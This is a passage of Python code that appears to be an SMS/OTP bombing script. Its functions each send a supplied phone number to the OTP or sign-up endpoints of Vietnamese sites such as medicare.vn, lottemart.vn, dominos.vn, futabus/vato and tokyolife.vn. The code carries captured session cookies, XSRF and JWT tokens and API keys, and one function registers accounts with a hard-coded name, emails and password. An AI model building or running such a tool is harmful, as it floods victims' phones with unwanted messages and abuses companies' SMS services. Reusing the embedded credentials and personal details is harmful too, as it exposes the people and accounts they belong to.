    'medicare_session': 'eyJpdiI6IjBQU2VzVHhNbWVSd0VJcHNMZWxJMHc9PSIsInZhbHVlIjoiUkNEODVKa1c1aHkyeldKMCtkVG5aTVBISVhXdmNYY2tpMktucFBWa2F3Z3UwYkZhMHczRnRSK2c5Ui9PblV4Tzczc1dZQy9GNWJvUktYWTBEd1pWa3dyN3JsRnowQjRRY2hOKzQ4OU1wbDhLOEhHcWcvWDVWeGxTOC9VSkVlZnUiLCJtYWMiOiI0YzFlYWE4NDQ5MGYzZGRmNGVjODQ2ZjBhMDdkZTJjNjFiNGIwMmFhMTYwMTYwOGJjNmUzOTNiMTI5MzUxZjllIiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.510182867.1720297701',
    '_gid': 'GA1.2.1839608181.1720297709',
    '_gat_gtag_UA_257373458_1': '1',
    '_fbp': 'fb.1.1720297708926.352505189707594376',
    '_ga_CEMYNHNKQ2': 'GS1.1.1720297700.1.1.1720297727.0.0.0',
    '_ga_8DLTVS911W': 'GS1.1.1720297700.1.1.1720297727.0.0.0',
    '_ga_R7XKMTVGEW': 'GS1.1.1720297700.1.1.1720297727.33.0.0',
}

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'SERVER=nginx3; _gcl_au=1.1.2035327165.1720297698; XSRF-TOKEN=eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6IjBQU2VzVHhNbWVSd0VJcHNMZWxJMHc9PSIsInZhbHVlIjoiUkNEODVKa1c1aHkyeldKMCtkVG5aTVBISVhXdmNYY2tpMktucFBWa2F3Z3UwYkZhMHczRnRSK2c5Ui9PblV4Tzczc1dZQy9GNWJvUktYWTBEd1pWa3dyN3JsRnowQjRRY2hOKzQ4OU1wbDhLOEhHcWcvWDVWeGxTOC9VSkVlZnUiLCJtYWMiOiI0YzFlYWE4NDQ5MGYzZGRmNGVjODQ2ZjBhMDdkZTJjNjFiNGIwMmFhMTYwMTYwOGJjNmUzOTNiMTI5MzUxZjllIiwidGFnIjoiIn0%3D; _ga=GA1.2.510182867.1720297701; _gid=GA1.2.1839608181.1720297709; _gat_gtag_UA_257373458_1=1; _fbp=fb.1.1720297708926.352505189707594376; _ga_CEMYNHNKQ2=GS1.1.1720297700.1.1.1720297727.0.0.0; _ga_8DLTVS911W=GS1.1.1720297700.1.1.1720297727.0.0.0; _ga_R7XKMTVGEW=GS1.1.1720297700.1.1.1720297727.33.0.0',
    'Origin': 'https://medicare.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://medicare.vn/login',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-XSRF-TOKEN': 'eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0=',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'mobile': phone,
    'mobile_country_prefix': '84',
}

    response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
def acfc(phone):
    cookies = {
    '_evga_d955': '{%22uuid%22:%22a93baeb4ee0b4f94%22}',
    '_gcl_gs': '2.1.k1$i1720297927',
    '_gcl_au': '1.1.1109989705.1720297932',
    '_gcl_aw': 'GCL.1720297933.Cj0KCQjw1qO0BhDwARIsANfnkv8mJ0q74DUUs3U7s_VOOT_naF0l0PVGx2vbS_DYa-tHmO_dFuxiIQwaApggEALw_wcB',
    '_ga': 'GA1.1.669040222.1720297933',
    '_sfid_599e': '{%22anonymousId%22:%22a93baeb4ee0b4f94%22%2C%22consents%22:[]}',
    '_tt_enable_cookie': '1',
    '_ttp': 'XkRw_9JIScHjzJOJvMn0bzslTxh',
    'PHPSESSID': 'puf048o1vjsq9933top4t6qhv3',
    'aws-waf-token': '537b5066-8836-44fa-b0bd-72500361bff3:BgoAqZCQRyMOAAAA:y7QyloBvBvA1oTMJqTaA5hHZdTah4qJ7CkCrjDS9+NLmNG1Sfhvhzq1hDBCUfXCfeEZB6FEyWIrMq6s/7Cn79NbkEqfIZtPCpyWr8ImIo70W7O12MJeFN5R1QRXf7BH0oX0cvtwqp/woaxMDXxUajbtxe9ZjVIN1prRIaPCEyeFvKcdw7V9wj4NvwGVyzLwvy4fYpOwWBcZ7ZJQkaRYcK+HUToRSgX/BkOWddqQ5vZYTOvJxohH/Ig==',
    'form_key': 'z6U4dNbxwcokMy9u',
    '_fbp': 'fb.2.1720297944244.46181901986930848',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'mage-messages': '',
    'optiMonkClientId': 'c6552caa-6bee-d03e-34ca-6d9b47869e59',
    '_ga_PS7MEHMFY3': 'GS1.1.1720297933.1.1.1720297944.49.0.0',
    'optiMonkClient': 'N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCYAGcqUqAFgjwBtjEyqa7G8A7AewAObMFixA===',
    'optiMonkSession': '1720297946',
    'form_key': 'z6U4dNbxwcokMy9u',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_evga_d955={%22uuid%22:%22a93baeb4ee0b4f94%22}; _gcl_gs=2.1.k1$i1720297927; _gcl_au=1.1.1109989705.1720297932; _gcl_aw=GCL.1720297933.Cj0KCQjw1qO0BhDwARIsANfnkv8mJ0q74DUUs3U7s_VOOT_naF0l0PVGx2vbS_DYa-tHmO_dFuxiIQwaApggEALw_wcB; _ga=GA1.1.669040222.1720297933; _sfid_599e={%22anonymousId%22:%22a93baeb4ee0b4f94%22%2C%22consents%22:[]}; _tt_enable_cookie=1; _ttp=XkRw_9JIScHjzJOJvMn0bzslTxh; PHPSESSID=puf048o1vjsq9933top4t6qhv3; aws-waf-token=537b5066-8836-44fa-b0bd-72500361bff3:BgoAqZCQRyMOAAAA:y7QyloBvBvA1oTMJqTaA5hHZdTah4qJ7CkCrjDS9+NLmNG1Sfhvhzq1hDBCUfXCfeEZB6FEyWIrMq6s/7Cn79NbkEqfIZtPCpyWr8ImIo70W7O12MJeFN5R1QRXf7BH0oX0cvtwqp/woaxMDXxUajbtxe9ZjVIN1prRIaPCEyeFvKcdw7V9wj4NvwGVyzLwvy4fYpOwWBcZ7ZJQkaRYcK+HUToRSgX/BkOWddqQ5vZYTOvJxohH/Ig==; form_key=z6U4dNbxwcokMy9u; _fbp=fb.2.1720297944244.46181901986930848; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; optiMonkClientId=c6552caa-6bee-d03e-34ca-6d9b47869e59; _ga_PS7MEHMFY3=GS1.1.1720297933.1.1.1720297944.49.0.0; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCYAGcqUqAFgjwBtjEyqa7G8A7AewAObMFixA===; optiMonkSession=1720297946; form_key=z6U4dNbxwcokMy9u',
    'origin': 'https://www.acfc.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.acfc.com.vn/customer/account/create/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'number_phone': phone,
    'form_key': 'z6U4dNbxwcokMy9u',
    'currentUrl': 'https://www.acfc.com.vn/customer/account/create/',
}

    response = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data)
def lote(phone):
    cookies = {
    '__Host-next-auth.csrf-token': '2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6',
    '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    '_gcl_au': '1.1.2136712951.1720299022',
    '_ga': 'GA1.1.164372556.1720299023',
    '_fbp': 'fb.1.1720299024438.549668172235070425',
    '_ga_6QLJ7DM4XW': 'GS1.1.1720299022.1.1.1720299051.31.0.0',
}

    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '__Host-next-auth.csrf-token=2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _gcl_au=1.1.2136712951.1720299022; _ga=GA1.1.164372556.1720299023; _fbp=fb.1.1720299024438.549668172235070425; _ga_6QLJ7DM4XW=GS1.1.1720299022.1.1.1720299051.31.0.0',
    'origin': 'https://www.lottemart.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'username': phone,
    'case': 'register',
}

    response = requests.post(
    'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def domi(phone):
    cookies = {
    '_gid': 'GA1.2.1143586587.1720312773',
    '_fbp': 'fb.1.1720312773608.72318382363231927',
    '_gcl_gs': '2.1.k1$i1720312921',
    '_gat_UA-41910789-1': '1',
    '_ga': 'GA1.1.2103093724.1720312773',
    '_ga_12HB7KTL5M': 'GS1.1.1720312772.1.1.1720312932.49.0.0',
    '_ga_8GXKYDTW3R': 'GS1.1.1720312772.1.1.1720312933.0.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '_gid=GA1.2.1143586587.1720312773; _fbp=fb.1.1720312773608.72318382363231927; _gcl_gs=2.1.k1$i1720312921; _gat_UA-41910789-1=1; _ga=GA1.1.2103093724.1720312773; _ga_12HB7KTL5M=GS1.1.1720312772.1.1.1720312932.49.0.0; _ga_8GXKYDTW3R=GS1.1.1720312772.1.1.1720312933.0.0.0',
    'dmn': 'doqkqr',
    'origin': 'https://dominos.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://dominos.vn/promotion-listing/bogo-week-digital-t7',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone_number': phone,
    'email': 'nguyentrongkhai130@gmail.com',
    'type': 0,
    'is_register': True,
}

    response = requests.post('https://dominos.vn/api/v1/users/send-otp', cookies=cookies, headers=headers, json=json_data)
def shop(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '441e8136801b70ac87887bca16dd298f',
    'origin': 'https://thefaceshop.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://thefaceshop.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720623654086',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def fu(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://futabus.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://futabus.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjU2OTFhMTk1YjI0MjVlMmFlZDYwNjMzZDdjYjE5MDU0MTU2Yjk3N2QiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMDYyMDYyMywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIwNjIwNjIzLCJleHAiOjE3MjA2MjQyMjMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.YR8S04KR7mVRqL68o-a-6svQibV5Gpx8ciD-oxmm3zYMYN55FIAzZPkaZ2rlFaNpGwGl5AkuTWgoVVTU5uTttWOADhoWhOMdICkz811oPzQcjVA0VVG2r7Vg6vVOuKdg3jbD6SJ0ySj6Ln96nI-kcy6Q_169sGYxKIGwknsfM91-NnFRi_D_xNulys0i4OxqRdHxpK42VRkzyl0hwj0sS-cd5i84MT8MtiyOZRhn9J89tMLkHVP5NAyDfHtjm3UYmJYbBRQQf-iaT2nu36AZ_dNRT6rtQuqNpk0vyCIEdPo-9t6cKhaW-I69DBcz5d73fleRTM3zHD-5DlJkpkcWKA',
    'x-app-id': 'client',
}

    json_data = {
    'phoneNumber': phone,
    'deviceId': 'e3025fb7-5436-4002-9950-e6564b3656a6',
    'use_for': 'LOGIN',
}

    response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)
def beau(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '584294d68530c7b753d7f5a77c1ddbc2',
    'origin': 'https://beautybox.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://beautybox.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720624059192',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def hoanvu(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '028601f79dcc724ef8b8e7c989c5f649',
    'origin': 'https://reebok.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://reebok.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720624197351',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def tokyo(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://tokyolife.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://tokyolife.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'signature': 'c1336d4c72c0b857cdd6aab4de261aa3',
    'timestamp': '1720624468348',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone_number': phone,
    'name': 'khải nguyễn',
    'password': 'vjyy1234',
    'email': 'trongkhai1118@gmail.com',
    'birthday': '2002-07-10',
    'gender': 'female',
}

    response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data)
def cir(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://circa.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://circa.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': {
        'country_code': '84',
        'phone_number': phone,
    },
}

    response = requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data)
def guma(phone):
    headers = {
    'Accept': 'application/json',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://gumac.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://gumac.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'phone': phone,
}

    response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
def hoang(phone):
    cookies = {
    'PHPSESSID': '023c4d0e7b15edc71f14f346ff4ef829',
    'form_key': 'KELcFD4RySb6WQsc',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'mage-messages': '',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'form_key': 'KELcFD4RySb6WQsc',
    '_fbp': 'fb.1.1720626061882.764993913589523922',
    '_pk_ses.564990520.6493': '*',
    '_gcl_gs': '2.1.k1$i1720626054',
    '_gcl_au': '1.1.676093199.1720626062',
    'au_id': '1550063352',
    '_ac_au_gt': '1720626058223',
    '_ga': 'GA1.1.42709150.1720626062',
    '_gcl_aw': 'GCL.1720626063.CjwKCAjw4ri0BhAvEiwA8oo6F2MiLFPQwoa8aYSViFa1OyQnHiLIFOvjgAyZ70q6t5zp2PnA6GbquhoCVgMQAvD_BwE',
    'cdp_session': '1',
    '_asm_visitor_type': 'r',
    'mst-cache-warmer-track': '1720626075588',
    '_asm_ss_view': '%7B%22time%22%3A1720626062220%2C%22sid%22%3A%225182297358166228%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-07-10T15%3A41%3A25%22%2C%22duration%22%3A23213%7D',
    '_ga_48P0WR3P2C': 'GS1.1.1720626062.1.1.1720626086.36.0.0',
    'private_content_version': '5e3e65678616f3e49864dce16d1f43de',
    'section_data_ids': '{}',
    '_pk_id.564990520.6493': '1550063352.1720626062.1.1720626136.1720626062.',
    '_ac_client_id': '1550063352.1720626132',
    '_ac_an_session': 'zmzizrzhzhzqzkzgzmzrzizlzlzhzhzrzdzizmzmzjzjzlzgzgzmzhzdzizkzhzjzlzhzlzizgzhzdzizdzizkzhzjzlzhzlzizgzhzdzizkzhzjzlzhzlzizgzhzdzizdzhznzdzhzd2f27zdzgzdzlzmzmznzqzdzd321v272624',
    'cdp_blocked_sid_17509314': 'true',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=023c4d0e7b15edc71f14f346ff4ef829; form_key=KELcFD4RySb6WQsc; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; form_key=KELcFD4RySb6WQsc; _fbp=fb.1.1720626061882.764993913589523922; _pk_ses.564990520.6493=*; _gcl_gs=2.1.k1$i1720626054; _gcl_au=1.1.676093199.1720626062; au_id=1550063352; _ac_au_gt=1720626058223; _ga=GA1.1.42709150.1720626062; _gcl_aw=GCL.1720626063.CjwKCAjw4ri0BhAvEiwA8oo6F2MiLFPQwoa8aYSViFa1OyQnHiLIFOvjgAyZ70q6t5zp2PnA6GbquhoCVgMQAvD_BwE; cdp_session=1; _asm_visitor_type=r; mst-cache-warmer-track=1720626075588; _asm_ss_view=%7B%22time%22%3A1720626062220%2C%22sid%22%3A%225182297358166228%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-07-10T15%3A41%3A25%22%2C%22duration%22%3A23213%7D; _ga_48P0WR3P2C=GS1.1.1720626062.1.1.1720626086.36.0.0; private_content_version=5e3e65678616f3e49864dce16d1f43de; section_data_ids={}; _pk_id.564990520.6493=1550063352.1720626062.1.1720626136.1720626062.; _ac_client_id=1550063352.1720626132; _ac_an_session=zmzizrzhzhzqzkzgzmzrzizlzlzhzhzrzdzizmzmzjzjzlzgzgzmzhzdzizkzhzjzlzhzlzizgzhzdzizdzizkzhzjzlzhzlzizgzhzdzizkzhzjzlzhzlzizgzhzdzizdzhznzdzhzd2f27zdzgzdzlzmzmznzqzdzd321v272624; cdp_blocked_sid_17509314=true',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6ImQ0YmU4OTUwMTY5YzFjM2IiLCJ0ciI6ImMzNzBjYzJiZTc1ZmQ0OGJmZTJjNDQ4YmM1MWIwMzI2IiwidGkiOjE3MjA2MjYyNzE1NTIsInRrIjoiMTMyMjg0MCJ9fQ==',
    'origin': 'https://hoang-phuc.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://hoang-phuc.com/customer/account/create/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-c370cc2be75fd48bfe2c448bc51b0326-d4be8950169c1c3b-01',
    'tracestate': '1322840@nr=0-1-4173019-1120237972-d4be8950169c1c3b----1720626271552',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'action_type': '1',
    'tel': phone,
}

    response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data)
def fm(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer',
    'cache-control': 'no-cache',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://fm.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://fm.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
